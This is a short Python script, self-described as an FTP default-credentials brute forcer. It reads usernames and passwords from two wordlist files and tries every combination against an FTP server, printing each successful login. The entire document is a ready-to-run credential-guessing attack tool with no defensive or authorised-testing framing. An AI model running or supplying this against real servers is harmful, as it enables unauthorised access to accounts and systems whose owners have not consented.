from ftplib import FTP

# Lion avatar banner
lion_banner = """
      (\,,/)
      (  @ @ )
---oOO-(_)-OOo---
Lion Avatar
FTP Default Creds Brute Forcer by Kasireddy
"""

# FTP server information
ftp_server = "ftp.example.com"
ftp_port = 21

# Function to attempt login with given credentials
def try_ftp_login(username, password):
    try:
        ftp = FTP()
        ftp.connect(ftp_server, ftp_port)
        ftp.login(username, password)
        ftp.quit()
        return True
    except Exception as e:
        return False

# Read usernames from username.txt
with open("username.txt", "r") as user_file:
    usernames = [line.strip() for line in user_file.readlines()]

# Read passwords from password.txt
with open("password.txt", "r") as pass_file:
    passwords = [line.strip() for line in pass_file.readlines()]

# Display the lion avatar banner
print(lion_banner)

# Flag to indicate if any login was successful
success = False

# Iterate through usernames and passwords
for password in passwords:
    for username in usernames:
        if try_ftp_login(username, password):
            print(f"Login successful for {username}:{password}")
            success = True
            break
        else:
            print(f"Login failed for {username}:{password}")

# Print a message if any login was successful
if success:
    print("\nAt least one login was successful.")
else:
    print("\nNo logins were successful.")
